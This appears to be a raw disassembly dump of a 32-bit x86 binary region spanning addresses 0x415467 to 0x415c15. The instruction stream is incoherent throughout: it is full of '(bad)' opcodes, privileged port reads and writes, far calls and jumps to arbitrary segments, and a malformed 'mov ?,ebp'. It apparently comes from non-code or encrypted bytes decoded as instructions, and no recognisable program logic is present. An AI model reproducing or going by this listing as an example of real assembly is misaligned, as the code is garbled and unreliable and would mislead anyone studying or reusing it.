  415467:	test   ax,bx
  41546a:	in     al,0xed
  41546c:	in     eax,dx
  41546d:	lahf   
  41546e:	mov    ch,0x2b
  415470:	jne    0x41545a
  415472:	ret    0x57f
  415475:	or     al,0xa1
  415477:	repnz repz cmps BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41547b:	push   ebx
  41547c:	mov    ah,0x8b
  41547e:	inc    ebp
  41547f:	mov    eax,ds:0x885eb77a
  415484:	pop    eax
  415485:	pop    esp
  415486:	nop
  415487:	push   0x40
  415489:	scas   eax,DWORD PTR es:[edi]
  41548a:	cld    
  41548b:	lods   eax,DWORD PTR ds:[esi]
  41548c:	pop    eax
  41548d:	test   DWORD PTR [esi-0x16],0xa5a5548d
  415494:	add    BYTE PTR [edx-0x59ac731f],bh
  41549a:	cmp    eax,0xe9d96910
  41549f:	or     eax,0x8eb17e50
  4154a4:	mov    ds:0x9249750c,eax
  4154a9:	push   es
  4154aa:	les    edx,FWORD PTR [edx-0xb30d900]
  4154b0:	(bad)  
  4154b1:	lock mov es,WORD PTR [eax-0x6]
  4154b5:	sub    eax,ebx
  4154b7:	arpl   bx,si
  4154b9:	mov    esi,ds
  4154bb:	in     eax,dx
  4154bc:	pop    ss
  4154bd:	xchg   BYTE PTR [edi-0x7f433e3c],cl
  4154c3:	xchg   esp,eax
  4154c4:	adc    esi,DWORD PTR [ebx+0x11]
  4154c7:	aas    
  4154c8:	lea    esi,[eax]
  4154ca:	aas    
  4154cb:	je     0x4154a6
  4154cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154ce:	mov    ebp,0x4966231
  4154d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154d4:	add    DWORD PTR [ebx+0x76ad5b4a],0xffffffd1
  4154db:	add    BYTE PTR [eax],dl
  4154dd:	lock dec edx
  4154df:	jae    0x4154c1
  4154e1:	mov    esp,edx
  4154e3:	push   ss
  4154e4:	rcr    BYTE PTR [ebp+ebx*4-0x1e],0x77
  4154e9:	and    BYTE PTR [esi],bh
  4154eb:	in     eax,0x1d
  4154ed:	push   ebx
  4154ee:	pop    ds
  4154ef:	int3   
  4154f0:	pushf  
  4154f1:	cmp    bh,BYTE PTR [ebp+edi*4+0x6]
  4154f5:	pop    ss
  4154f6:	xor    BYTE PTR [ebp-0x1f],ch
  4154f9:	scas   al,BYTE PTR es:[edi]
  4154fa:	and    ebp,DWORD PTR [esi+eiz*1-0x60ed28af]
  415501:	xlat   BYTE PTR ds:[ebx]
  415502:	dec    edx
  415503:	xor    al,0x49
  415505:	stos   DWORD PTR es:[edi],eax
  415506:	xchg   esi,eax
  415507:	xchg   ebx,eax
  415508:	sub    BYTE PTR [ecx],0xed
  41550b:	sbb    esi,edi
  41550d:	(bad)  
  41550f:	or     BYTE PTR [esi+0xcb0010d],bh
  415515:	fsub   DWORD PTR [edi-0x4a9d048e]
  41551b:	pop    edi
  41551c:	aam    0x68
  41551e:	mov    esi,0xa2ef7218
  415523:	adc    BYTE PTR [eax],cl
  415525:	xchg   edi,eax
  415526:	xchg   dl,bh
  415528:	jecxz  0x41556b
  41552a:	cli    
  41552b:	aas    
  41552c:	mov    ecx,0x5f74c712
  415531:	inc    eax
  415532:	pop    eax
  415533:	es rcr bl,cl
  415536:	push   eax
  415537:	push   eax
  415538:	icebp  
  415539:	pop    ecx
  41553a:	mov    esi,0xd69b16ee
  41553f:	xchg   edi,eax
  415540:	cwde   
  415541:	adc    eax,0xc7c5c71f
  415546:	push   0x21
  415548:	push   edx
  415549:	push   0x41
  41554b:	repz inc esi
  41554d:	adc    BYTE PTR [ecx],dh
  41554f:	imul   ebx,DWORD PTR [edi+0x7],0x791c59a9
  415556:	loope  0x4155ca
  415558:	pop    ss
  415559:	or     bl,bl
  41555b:	popa   
  41555c:	xchg   edx,eax
  41555d:	push   es
  41555e:	fcomp  QWORD PTR [eax]
  415560:	(bad)  
  415561:	or     ebx,DWORD PTR [eax]
  415563:	lahf   
  415564:	mov    ebx,0x9a95ea39
  415569:	dec    esp
  41556a:	xor    ecx,DWORD PTR [edx+0x6]
  41556d:	test   BYTE PTR [ecx+0x1b877035],cl
  415573:	and    al,0x4b
  415575:	add    eax,0x159e5e7c
  41557a:	fiadd  DWORD PTR [eax+0x12]
  41557d:	fucomi st,st(5)
  41557f:	or     BYTE PTR [ebx+0x59],0x2
  415583:	add    DWORD PTR ds:0xe23236c6,edi
  415589:	outs   dx,BYTE PTR ds:[esi]
  41558a:	mov    ah,0x5a
  41558c:	rcl    DWORD PTR [ebx-0x23],0x85
  415590:	mov    dh,0x10
  415592:	int3   
  415593:	nop
  415594:	and    eax,0x4c3e2b7b
  415599:	int3   
  41559a:	outs   dx,BYTE PTR ds:[esi]
  41559b:	jmp    DWORD PTR [eax+0x66f5208b]
  4155a1:	ret    0x5042
  4155a4:	jecxz  0x41557d
  4155a6:	jbe    0x415535
  4155a8:	push   ds
  4155a9:	mov    bh,0x97
  4155ab:	fs js  0x41558e
  4155ae:	call   0x985d:0x4d3b8d08
  4155b5:	js     0x4155b5
  4155b7:	dec    ebp
  4155b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155b9:	xlat   BYTE PTR ds:[ebx]
  4155ba:	lods   al,BYTE PTR ds:[esi]
  4155bb:	pop    edx
  4155bc:	aas    
  4155bd:	mov    edi,0x43eb8218
  4155c2:	loop   0x4155d0
  4155c4:	pop    edx
  4155c5:	xlat   BYTE PTR ds:[ebx]
  4155c6:	and    al,0x8b
  4155c8:	pop    ds
  4155c9:	mov    al,ds:0xaecf1d7
  4155ce:	pop    ebp
  4155cf:	fcomi  st,st(1)
  4155d1:	ins    BYTE PTR es:[edi],dx
  4155d2:	mov    al,ds:0xc55342ae
  4155d7:	cmp    al,0xf5
  4155d9:	daa    
  4155da:	jmp    0x43f70e4a
  4155df:	jno    0x4155bb
  4155e1:	cs or  eax,0x155f4b93
  4155e7:	mov    ds:0x7cd20b9d,eax
  4155ec:	or     BYTE PTR [eax],ah
  4155ee:	scas   eax,DWORD PTR es:[edi]
  4155ef:	test   ebx,eax
  4155f1:	je     0x415631
  4155f3:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4155f5:	out    0xee,al
  4155f7:	dec    esp
  4155f8:	js     0x415628
  4155fa:	mov    bh,0xdf
  4155fc:	aas    
  4155fd:	test   BYTE PTR [ebx],dl
  4155ff:	repz adc ch,bl
  415602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415603:	pop    edi
  415604:	xor    dh,cl
  415606:	jmp    0x1ed7:0xa7c39ce9
  41560d:	loope  0x415639
  41560f:	and    DWORD PTR [edx-0x2f],edx
  415612:	int    0xa3
  415614:	arpl   WORD PTR ds:0xb06ebb73,bp
  41561a:	(bad)  
  41561b:	adc    al,0x70
  41561d:	retf   0xc5c9
  415620:	mov    edi,DWORD PTR [ecx+0x4e53412]
  415626:	add    BYTE PTR [edi-0x66],ah
  415629:	(bad)  
  41562a:	sub    eax,0xb3f028ab
  41562f:	adc    al,0xd6
  415631:	push   esp
  415632:	add    eax,0x5052c1e3
  415637:	pop    eax
  415638:	int    0xa7
  41563a:	adc    BYTE PTR [ebp+0x4],cl
  41563d:	inc    ebp
  41563e:	jae    0x4155ef
  415640:	mov    dl,0x4
  415642:	pushf  
  415643:	mov    WORD PTR [esi+edx*2+0x58],gs
  415647:	fbld   TBYTE PTR [edx-0x4d]
  41564a:	add    eax,0xa4f6feab
  41564f:	pop    ebx
  415650:	inc    ebp
  415651:	ret    0x59ed
  415654:	out    0x17,eax
  415656:	dec    eax
  415657:	dec    esp
  415658:	dec    edx
  415659:	adc    BYTE PTR ds:0x56645dc6,ah
  41565f:	cli    
  415660:	aad    0x3c
  415662:	mov    ecx,0x42a037bd
  415667:	or     edi,DWORD PTR [ebp-0x2ac56544]
  41566d:	loopne 0x4156ec
  41566f:	jb     0x41561b
  415671:	dec    ebx
  415672:	dec    esp
  415673:	jno    0x4156a5
  415675:	inc    ecx
  415676:	push   0xffffffc0
  415678:	test   BYTE PTR [edi],ah
  41567a:	scas   al,BYTE PTR es:[edi]
  41567b:	out    0x41,al
  41567d:	stos   BYTE PTR es:[edi],al
  41567e:	adc    ah,BYTE PTR [esi+0x625aead]
  415684:	ficom  WORD PTR [edx-0x1d]
  415687:	outs   dx,BYTE PTR ds:[esi]
  415688:	aad    0x85
  41568a:	ror    DWORD PTR [ecx],cl
  41568c:	lods   eax,DWORD PTR ds:[esi]
  41568d:	pop    ss
  41568e:	jae    0x41565b
  415690:	les    eax,FWORD PTR [ebx]
  415692:	add    al,0xe4
  415694:	clc    
  415695:	cmp    ch,BYTE PTR [edi]
  415697:	test   al,0x4a
  415699:	mov    DWORD PTR [eax+esi*8-0x31],edi
  41569d:	pop    eax
  41569e:	mov    esp,esi
  4156a0:	add    al,0x61
  4156a2:	jp     0x4156f1
  4156a4:	stos   DWORD PTR es:[edi],eax
  4156a5:	adc    BYTE PTR [eax],dh
  4156a7:	inc    ebx
  4156a8:	(bad)  
  4156a9:	cli    
  4156aa:	jae    0x4156c5
  4156ac:	gs test al,0x88
  4156af:	ins    DWORD PTR es:[edi],dx
  4156b0:	inc    esi
  4156b1:	mov    bh,0x79
  4156b3:	popa   
  4156b4:	mov    bl,cl
  4156b6:	(bad)  
  4156b7:	mov    esi,0x9e0a17b9
  4156bc:	mov    esi,0x4de3d8bf
  4156c1:	jns    0x415724
  4156c3:	jno    0x415739
  4156c5:	add    al,0x5f
  4156c7:	sub    edi,edx
  4156c9:	sub    dh,BYTE PTR ds:0x343ad7f9
  4156cf:	push   es
  4156d0:	jmp    0x29d2:0x2172ee8c
  4156d7:	dec    esi
  4156d8:	sbb    DWORD PTR [edx+0x23],ebp
  4156db:	pop    ebp
  4156dc:	ja     0x4156f3
  4156de:	pop    esp
  4156df:	push   edi
  4156e0:	ins    BYTE PTR es:[edi],dx
  4156e1:	pop    ecx
  4156e2:	or     al,BYTE PTR [esi+0x6c]
  4156e5:	popf   
  4156e6:	lahf   
  4156e7:	jo     0x415683
  4156e9:	and    eax,DWORD PTR [ecx]
  4156eb:	xchg   edx,eax
  4156ec:	lods   eax,DWORD PTR ds:[esi]
  4156ed:	or     dl,BYTE PTR [ecx-0xfef20e6]
  4156f3:	sbb    DWORD PTR [ebx],eax
  4156f5:	ret    0x5a54
  4156f8:	push   cs
  4156f9:	popa   
  4156fa:	mov    bh,0x8d
  4156fc:	and    eax,0x2c7663e0
  415701:	arpl   WORD PTR [ebx+0x36],sp
  415704:	mov    edi,0x268fbb40
  415709:	sahf   
  41570a:	push   ebx
  41570b:	mov    ebp,0xa8636ffb
  415710:	mov    eax,ds:0x646e907d
  415715:	jae    0x4156b3
  415717:	push   es
  415718:	pop    eax
  415719:	pop    eax
  41571a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41571b:	xor    al,0x4f
  41571d:	test   al,0xfb
  41571f:	inc    edx
  415720:	out    dx,al
  415721:	adc    edi,ecx
  415723:	jne    0x4156da
  415725:	xchg   BYTE PTR [esi-0x79ddc570],dl
  41572b:	enter  0x2edc,0x4e
  41572f:	and    DWORD PTR [eax+0x48],edx
  415732:	mov    edx,0x7c11f9e5
  415737:	inc    edi
  415738:	add    eax,0x746ba00c
  41573d:	sub    BYTE PTR [esi],0x15
  415740:	fcom   DWORD PTR [edi+0x344b892]
  415746:	jle    0x41575d
  415748:	repnz cmp bl,ch
  41574b:	aas    
  41574c:	popa   
  41574d:	jnp    0x4156f3
  41574f:	retf   0x15c1
  415752:	mov    bh,0x7b
  415754:	enter  0xd1d5,0x94
  415758:	add    eax,0x7c4f419c
  41575d:	mov    ebx,0xc12b3cd
  415762:	push   es
  415763:	pop    edi
  415764:	xchg   ebx,eax
  415765:	xchg   esp,eax
  415766:	jnp    0x41571b
  415768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415769:	dec    ebp
  41576a:	xchg   edi,eax
  41576b:	xchg   BYTE PTR [ebx-0xf],ch
  41576e:	cmp    BYTE PTR [ecx],ch
  415770:	in     al,dx
  415771:	cli    
  415772:	es pop eax
  415774:	cmp    BYTE PTR [edi-0x18],al
  415777:	ror    dl,cl
  415779:	repnz aam 0xda
  41577c:	stos   DWORD PTR es:[edi],eax
  41577d:	xchg   ecx,eax
  41577e:	mov    bl,0xdc
  415780:	iret   
  415781:	add    DWORD PTR [ebx+edx*2-0xeabc9ce],esi
  415788:	pop    eax
  415789:	in     eax,dx
  41578a:	aam    0x32
  41578c:	iret   
  41578d:	push   0x3cf1e9cb
  415792:	and    DWORD PTR [eax+0x44],0x82d7c44c
  415799:	repz div BYTE PTR [ebp+0x6b0696c3]
  4157a0:	push   edx
  4157a1:	(bad)  
  4157a3:	adc    DWORD PTR [ebx+0x64bec77d],0x7a30d8b3
  4157ad:	mov    ch,0xc6
  4157af:	clc    
  4157b0:	ret    0xf4fc
  4157b3:	mov    edi,0xc55e747
  4157b8:	(bad)  
  4157b9:	adc    eax,0x535ef592
  4157be:	call   0xe37:0xea61217a
  4157c5:	sahf   
  4157c6:	xchg   esp,eax
  4157c7:	sbb    BYTE PTR [ebp-0xa],ch
  4157ca:	and    ecx,edx
  4157cc:	inc    eax
  4157cd:	iret   
  4157ce:	sub    DWORD PTR [edi-0x2],ebx
  4157d1:	mov    cl,0x53
  4157d3:	dec    eax
  4157d4:	and    eax,DWORD PTR [eax+0x6eb92324]
  4157da:	sbb    BYTE PTR [edx+0x77],al
  4157dd:	shr    DWORD PTR [ebx-0x5841f08c],0x5
  4157e4:	pop    edx
  4157e5:	test   esp,esi
  4157e7:	cmc    
  4157e8:	inc    edx
  4157e9:	cs stos BYTE PTR es:[edi],al
  4157eb:	dec    edi
  4157ec:	push   ebp
  4157ed:	fs mov esi,0x19a86632
  4157f3:	addr16 aam 0x24
  4157f6:	pop    ebp
  4157f7:	pushf  
  4157f8:	loop   0x4157df
  4157fa:	jno    0x41585d
  4157fc:	pop    edx
  4157fd:	push   ecx
  4157fe:	fwait
  4157ff:	and    DWORD PTR [edx],edi
  415801:	(bad)  
  415802:	jmp    0x560efd7a
  415807:	mov    edi,0xaa835d5e
  41580c:	push   ss
  41580d:	imul   edi,DWORD PTR [edx+0x59],0x70
  415811:	mov    edx,0xebd37d08
  415816:	xchg   BYTE PTR [esi+0x4c2db78],ah
  41581c:	cmp    cl,BYTE PTR [eax]
  41581e:	xchg   ecx,eax
  41581f:	loopne 0x415854
  415821:	hlt    
  415822:	add    al,0xe3
  415824:	shr    bh,cl
  415826:	stos   DWORD PTR es:[edi],eax
  415827:	mov    eax,ds:0x63302530
  41582c:	iret   
  41582d:	jbe    0x415852
  41582f:	add    BYTE PTR [eax-0x64bae7ae],bh
  415835:	dec    ebp
  415836:	push   edx
  415837:	enter  0x90f8,0x33
  41583b:	mov    cl,0x45
  41583d:	mov    bl,0x12
  41583f:	mov    ch,0x22
  415841:	sbb    ebx,DWORD PTR [ebx-0x2d8fb8e5]
  415847:	sbb    eax,0xb9cd9571
  41584c:	sti    
  41584d:	inc    ebp
  41584e:	call   0xda1bc018
  415853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415854:	aam    0x9f
  415856:	retf   0x1814
  415859:	mov    edx,0x6f27ec64
  41585e:	mov    eax,0x41a6b94b
  415863:	jbe    0x4158be
  415865:	iret   
  415866:	dec    esp
  415867:	scas   al,BYTE PTR es:[edi]
  415868:	sub    al,cl
  41586a:	shl    BYTE PTR ds:0x224f218a,cl
  415870:	sti    
  415871:	outs   dx,DWORD PTR ds:[esi]
  415872:	mov    ah,0x95
  415874:	push   0x6e649563
  415879:	fsub   QWORD PTR [ebx-0x4bbde81]
  41587f:	mov    es,WORD PTR [edx+ebx*8-0x5d3106ec]
  415886:	fisub  WORD PTR [bp+0x1a48]
  41588b:	jmp    FWORD PTR [ecx+esi*8]
  41588e:	les    ebp,FWORD PTR [esi+0x36d70a2f]
  415894:	sbb    eax,0x9222a210
  415899:	loop   0x4158fc
  41589b:	dec    edx
  41589c:	(bad)  
  41589d:	jge    0x4158fe
  41589f:	xor    eax,0x46b7eaf
  4158a4:	(bad)  
  4158a5:	ins    BYTE PTR es:[edi],dx
  4158a6:	fld    QWORD PTR [ebx-0x55]
  4158a9:	cmp    eax,0x9756faba
  4158ae:	pop    ebp
  4158af:	int    0x26
  4158b1:	jo     0x41588f
  4158b3:	and    BYTE PTR [ebx+0x7d2a7a76],ch
  4158b9:	pusha  
  4158ba:	cdq    
  4158bb:	mov    ds:0x76c951,al
  4158c0:	add    al,0x4c
  4158c3:	imul   eax,DWORD PTR [edi],0x9e289153
  4158c9:	or     dh,cl
  4158cb:	pop    esp
  4158cc:	out    dx,al
  4158cd:	in     eax,dx
  4158ce:	xchg   esp,eax
  4158cf:	fst    DWORD PTR [edx+0x9]
  4158d2:	mov    ebx,0xa65d6200
  4158d7:	cwde   
  4158d8:	outs   dx,DWORD PTR ds:[esi]
  4158d9:	push   0x6fd4203b
  4158de:	ficom  WORD PTR [eax+0x12a80213]
  4158e4:	add    eax,DWORD PTR [ecx+0x6c482000]
  4158ea:	pop    es
  4158eb:	xor    DWORD PTR [edi],0x45220c74
  4158f1:	out    dx,al
  4158f2:	xchg   esi,eax
  4158f3:	add    DWORD PTR [edi],ebx
  4158f5:	iret   
  4158f6:	jmp    0x4615:0xf63a6a2f
  4158fd:	les    esi,FWORD PTR [ebx+0x23]
  415900:	mov    bl,0x1c
  415902:	popf   
  415903:	stos   DWORD PTR es:[edi],eax
  415904:	mov    eax,0x81a142d1
  415909:	cmp    DWORD PTR [ebp+esi*8-0x67],ebx
  41590d:	scas   al,BYTE PTR es:[edi]
  41590e:	call   0x38ac:0xb6dd32ce
  415915:	outs   dx,DWORD PTR ds:[esi]
  415916:	lods   eax,DWORD PTR ds:[esi]
  415917:	mov    eax,0x69b022ba
  41591c:	mov    al,0x6
  41591e:	adc    edx,DWORD PTR [ecx]
  415920:	shl    DWORD PTR cs:[esi],0x85
  415924:	mov    ds:0x8fef4d9c,eax
  415929:	aaa    
  41592a:	lea    ebp,[ebx+0x622b3a1d]
  415930:	aaa    
  415931:	jp     0x4158cd
  415933:	mov    dh,0xf1
  415935:	adc    DWORD PTR [edi-0x34],eax
  415938:	cmp    DWORD PTR [ebx+0x19],edx
  41593b:	fld    TBYTE PTR [ebx+0x27]
  41593e:	sbb    eax,0x60e25f4e
  415943:	inc    ecx
  415944:	cmc    
  415945:	mov    dl,0xef
  415947:	xchg   ebp,eax
  415948:	add    DWORD PTR [ebp+0x0],0x116d0150
  41594f:	loopne 0x415928
  415951:	dec    ecx
  415952:	push   cs
  415953:	sub    al,0x61
  415955:	je     0x415963
  415957:	cmc    
  415958:	pop    es
  415959:	cs mov bl,0xbf
  41595c:	jns    0x415990
  41595e:	dec    edx
  41595f:	mov    edi,0x20dcafcb
  415964:	cdq    
  415965:	lock mov ecx,0x833b8f24
  41596b:	out    dx,al
  41596c:	xchg   DWORD PTR [ebx+0x7bd0ad0d],edi
  415972:	and    eax,0x5efd146e
  415977:	or     DWORD PTR [ebx+0x18],esi
  41597a:	or     edi,ebp
  41597c:	dec    edi
  41597d:	inc    esi
  41597e:	mov    ebx,0xb91ec08f
  415983:	aaa    
  415984:	fcom   DWORD PTR [eax+0x566982d1]
  41598a:	fld    TBYTE PTR [edx]
  41598c:	icebp  
  41598d:	xor    al,0x74
  41598f:	clc    
  415990:	dec    ebx
  415991:	pop    ebp
  415992:	test   BYTE PTR [edi],0x77
  415995:	mov    ch,0xf
  415997:	inc    esp
  415998:	add    bl,BYTE PTR [ebx+0x4c]
  41599b:	(bad)  
  41599c:	push   DWORD PTR [ebx-0x74]
  41599f:	xchg   edx,eax
  4159a0:	sahf   
  4159a1:	fld    TBYTE PTR [ecx+0x6137cf33]
  4159a7:	pop    ebp
  4159a8:	pop    ds
  4159a9:	int    0x8f
  4159ab:	pop    eax
  4159ac:	xchg   esp,eax
  4159ad:	fdivr  DWORD PTR [eax+0x8]
  4159b0:	pop    eax
  4159b1:	push   esi
  4159b2:	imul   ecx,DWORD PTR [edx],0xffffffcb
  4159b5:	mov    ?,ebp
  4159b7:	push   cs
  4159b8:	lea    ebp,[ebx+0x78]
  4159bb:	sbb    cl,BYTE PTR [esi+0x51]
  4159be:	and    eax,0xec854e8c
  4159c3:	cmp    DWORD PTR [ebx+0xe],ecx
  4159c6:	jge    0x41595d
  4159c8:	lods   eax,DWORD PTR ds:[esi]
  4159c9:	sub    ah,BYTE PTR ds:0x1f11a535
  4159cf:	in     eax,dx
  4159d0:	test   al,0x38
  4159d2:	jl     0x415997
  4159d4:	lea    ecx,[esi+0x1e79297c]
  4159da:	and    ah,cl
  4159dc:	sbb    DWORD PTR [esi-0x4b38100e],ecx
  4159e2:	xor    BYTE PTR [ebx-0x6927df77],0x44
  4159e9:	aaa    
  4159ea:	push   0x78
  4159ec:	outs   dx,DWORD PTR ds:[esi]
  4159ed:	fbstp  TBYTE PTR [ecx-0x28]
  4159f0:	fwait
  4159f1:	inc    ebx
  4159f2:	adc    al,0x65
  4159f4:	jge    0x415a73
  4159f6:	in     eax,0x5b
  4159f8:	mov    eax,esi
  4159fa:	jb     0x4159a5
  4159fc:	lods   eax,DWORD PTR ds:[esi]
  4159fd:	icebp  
  4159fe:	leave  
  4159ff:	(bad)  
  415a00:	sbb    eax,0xc523eef3
  415a05:	mov    WORD PTR [ecx+eax*4],gs
  415a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a09:	ja     0x415a07
  415a0b:	outs   dx,BYTE PTR ds:[esi]
  415a0c:	add    dh,BYTE PTR [esi]
  415a0e:	enter  0x59a4,0x13
  415a12:	ja     0x4159d1
  415a14:	ja     0x415a19
  415a16:	stc    
  415a17:	dec    esp
  415a18:	sbb    dh,al
  415a1a:	or     eax,0xbd7f6a8b
  415a1f:	mov    bl,0x24
  415a21:	xchg   esp,eax
  415a22:	jecxz  0x4159d3
  415a24:	sti    
  415a25:	stos   BYTE PTR es:[edi],al
  415a26:	out    0x15,eax
  415a28:	in     eax,dx
  415a29:	icebp  
  415a2a:	and    DWORD PTR [ecx-0x6f],0xedfacb58
  415a31:	mov    cl,BYTE PTR [ebp-0x32]
  415a34:	je     0x415aa1
  415a36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a37:	jb     0x415a00
  415a39:	sub    eax,DWORD PTR [eax+0x34]
  415a3c:	(bad)
  415a3f:	mov    DWORD PTR ds:0xe27a72da,ebx
  415a45:	data16 mov dh,0x42
  415a49:	loop   0x415aa2
  415a4b:	fdivr  DWORD PTR [esi+ecx*2+0x1c05fd02]
  415a52:	inc    edx
  415a53:	mov    ecx,0x6d5e31e0
  415a58:	stc    
  415a59:	sbb    bl,BYTE PTR [ecx-0x406af14c]
  415a5f:	rol    BYTE PTR [edi-0x4f],1
  415a62:	push   cs
  415a63:	mov    eax,ds:0xdd4e1b9
  415a68:	nop
  415a69:	mov    ch,bl
  415a6b:	pop    ebx
  415a6c:	jb     0x415a6d
  415a6e:	dec    esi
  415a6f:	rcr    DWORD PTR [eax-0x3e],cl
  415a72:	imul   ebx,DWORD PTR [ecx+0x6660687c],0xdb1c3861
  415a7c:	push   es
  415a7d:	jp     0x415a95
  415a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a80:	mov    ch,0x2f
  415a82:	add    BYTE PTR [ebx+ecx*2-0x51a2c50],cl
  415a89:	mov    cl,0x9e
  415a8b:	pop    ebx
  415a8c:	shl    BYTE PTR [ebp-0x66ee6599],0xac
  415a93:	inc    esi
  415a94:	nop
  415a95:	dec    edx
  415a96:	outs   dx,BYTE PTR ds:[esi]
  415a97:	add    BYTE PTR [edx],dh
  415a99:	inc    esp
  415a9a:	pop    ss
  415a9b:	mov    dh,0x9d
  415a9d:	adc    al,0x37
  415a9f:	cs jo  0x415a94
  415aa2:	mov    al,ds:0xf8d69aae
  415aa7:	aas    
  415aa8:	fisttp WORD PTR [ebp-0x2a705416]
  415aae:	das    
  415aaf:	lea    eax,[eax+edx*8+0x57]
  415ab3:	repz out 0xaf,al
  415ab6:	daa    
  415ab7:	les    eax,FWORD PTR [esi-0x35]
  415aba:	dec    ebp
  415abb:	test   BYTE PTR [ebx+0x26],0xf4
  415abf:	es dec esp
  415ac1:	js     0x415b16
  415ac3:	cmp    eax,0xc52aa04a
  415ac8:	cdq    
  415ac9:	push   edi
  415aca:	pop    ss
  415acb:	fmul   DWORD PTR [ebp-0x7fdf4164]
  415ad1:	inc    edx
  415ad2:	loope  0x415b3c
  415ad4:	pause  
  415ad6:	inc    esp
  415ad7:	outs   dx,BYTE PTR ds:[esi]
  415ad8:	test   eax,0x375fc632
  415add:	xor    bh,cl
  415adf:	xor    eax,0x6de51d95
  415ae4:	push   ds
  415ae5:	pop    ecx
  415ae6:	retf   
  415ae7:	cmp    DWORD PTR [eax],edx
  415ae9:	fild   DWORD PTR [edx-0x633f654]
  415aef:	push   es
  415af0:	push   ecx
  415af1:	xor    bh,BYTE PTR [ecx+0x6c]
  415af4:	into   
  415af5:	pop    ecx
  415af6:	out    0x28,eax
  415af8:	sbb    esi,0x28
  415afb:	xchg   eax,ecx
  415afd:	test   al,0xe7
  415aff:	mov    bh,0xa3
  415b01:	imul   eax,esp,0xffffff9d
  415b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b05:	mov    eax,ds:0xf73f3b45
  415b0a:	inc    ebp
  415b0b:	cmp    edx,DWORD PTR [eax]
  415b0d:	ds inc esi
  415b0f:	push   edx
  415b10:	pop    edi
  415b11:	adc    BYTE PTR [ebp+ecx*2+0x510f9168],bl
  415b18:	jne    0x415b15
  415b1a:	loop   0x415aaf
  415b1c:	and    al,0x6f
  415b1e:	loopne 0x415b3d
  415b20:	cdq    
  415b21:	daa    
  415b22:	dec    esi
  415b24:	clc    
  415b25:	sbb    DWORD PTR [ebx],0xffffff98
  415b28:	pop    edx
  415b29:	mov    es,WORD PTR [ebp-0xb592b37]
  415b2f:	mov    dl,cl
  415b31:	popf   
  415b32:	not    BYTE PTR [ecx]
  415b34:	daa    
  415b35:	inc    esi
  415b36:	fsub   QWORD PTR [edx]
  415b38:	repz out dx,eax
  415b3a:	jae    0x415ad7
  415b3c:	xchg   ebp,eax
  415b3d:	cmp    eax,0x3826aee6
  415b42:	fbld   TBYTE PTR [ebp+0x3c]
  415b45:	aam    0x90
  415b47:	sbb    BYTE PTR [ebx-0x5983c131],0x76
  415b4e:	push   ebp
  415b4f:	ja     0x415b71
  415b51:	xchg   DWORD PTR [esi+0x4bc82466],ecx
  415b57:	lds    esp,FWORD PTR [ebx]
  415b59:	and    DWORD PTR [edx+ebx*2-0x1673304a],edx
  415b60:	retf   0xeb1d
  415b63:	and    al,0x63
  415b65:	xchg   esi,eax
  415b66:	aam    0x4b
  415b68:	pop    edx
  415b69:	xchg   BYTE PTR [eax-0x34],ch
  415b6c:	push   esp
  415b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b6e:	shl    DWORD PTR [edi+eax*4],0x33
  415b72:	mov    al,ds:0x5d544cfe
  415b77:	mov    ebp,0x2e020888
  415b7c:	push   ds
  415b7d:	add    DWORD PTR [edi],ebx
  415b7f:	stc    
  415b80:	nop
  415b81:	add    DWORD PTR [edi-0x22e5a173],ebp
  415b87:	push   esi
  415b88:	hlt    
  415b89:	push   esp
  415b8a:	adc    ebx,DWORD PTR ds:0xd19d95a7
  415b90:	pop    edx
  415b91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b92:	mov    esi,0x6051e76e
  415b97:	scas   al,BYTE PTR es:[edi]
  415b98:	mov    dl,0xc2
  415b9a:	or     al,0x1e
  415b9c:	mov    esi,edx
  415b9e:	mov    dl,0x67
  415ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ba1:	dec    edi
  415ba2:	xchg   ecx,eax
  415ba3:	stos   BYTE PTR es:[edi],al
  415ba4:	pusha  
  415ba5:	push   0x27
  415ba7:	push   cs
  415ba8:	mov    ds:0x4b8c2b23,al
  415bad:	push   ss
  415bae:	out    dx,eax
  415baf:	sti    
  415bb0:	inc    ebp
  415bb1:	out    dx,al
  415bb2:	mov    ebp,0x1af152e5
  415bb7:	(bad)
  415bbb:	xor    al,0xd2
  415bbd:	mov    cl,0x83
  415bbf:	mov    dl,0x72
  415bc1:	pop    ss
  415bc2:	mov    ebx,ebp
  415bc4:	pop    esi
  415bc5:	test   DWORD PTR [ebp+0x1b],edx
  415bc8:	loopne 0x415bf3
  415bca:	push   ebx
  415bcb:	xchg   ebp,eax
  415bcc:	and    al,0x13
  415bce:	shl    DWORD PTR [edx],cl
  415bd0:	push   eax
  415bd1:	nop
  415bd2:	mov    cl,0xd2
  415bd4:	sbb    al,0xa0
  415bd6:	idiv   dl
  415bd8:	xchg   ebp,eax
  415bd9:	ss sbb al,0x71
  415bdc:	aam    0x46
  415bde:	or     DWORD PTR ds:0x6030b729,edi
  415be4:	adc    cl,BYTE PTR [eax-0x47d21681]
  415bea:	push   ds
  415beb:	mov    cl,0xa6
  415bed:	(bad)
  415bf1:	pusha  
  415bf2:	jmp    0x415b80
  415bf4:	push   0xffffff84
  415bf6:	and    DWORD PTR [edi],edx
  415bf8:	or     al,0xc2
  415bfa:	nop
  415bfb:	inc    eax
  415bfc:	call   0xe001:0x7a2d6057
  415c03:	add    cl,BYTE PTR [ebp-0x2d]
  415c06:	pop    es
  415c07:	in     eax,0x40
  415c09:	mov    ds:0x6454b1b0,al
  415c0e:	stos   DWORD PTR es:[edi],eax
  415c0f:	pop    edx
  415c10:	sbb    eax,0x1bbc55ea
  415c15:	push   ss
